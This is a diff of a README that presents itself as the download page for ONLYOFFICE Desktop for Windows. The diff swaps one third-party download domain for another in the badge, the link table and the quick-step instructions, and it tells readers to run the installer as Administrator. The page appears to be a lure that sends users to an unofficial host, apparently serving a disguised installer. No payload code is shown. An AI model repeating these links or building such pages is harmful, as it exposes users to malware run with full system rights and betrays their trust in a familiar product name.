@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **ONLYOFFICE Desktop** for Windows.
 
 <p align="center">
-  <a href="https://onlyoffice.wonderchain.fun/">
+  <a href="https://onlyoffice.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-ONLYOFFICE%20Desktop-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download ONLYOFFICE Desktop">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[onlyoffice.wonderchain.fun](https://onlyoffice.wonderchain.fun/)** |
-| **Full URL** | `https://onlyoffice.wonderchain.fun/` |
+| **Direct link** | **[onlyoffice.kolmods.com](https://onlyoffice.kolmods.com/)** |
+| **Full URL** | `https://onlyoffice.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — onlyoffice.wonderchain.fun](https://onlyoffice.wonderchain.fun/)** (link above)
+1. Click **[Download — onlyoffice.kolmods.com](https://onlyoffice.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://onlyoffice.wonderchain.fun/"><strong>⬇ Download ONLYOFFICE Desktop now</strong></a></p>
+<p align="center"><a href="https://onlyoffice.kolmods.com/"><strong>⬇ Download ONLYOFFICE Desktop now</strong></a></p>
 
 ---
 
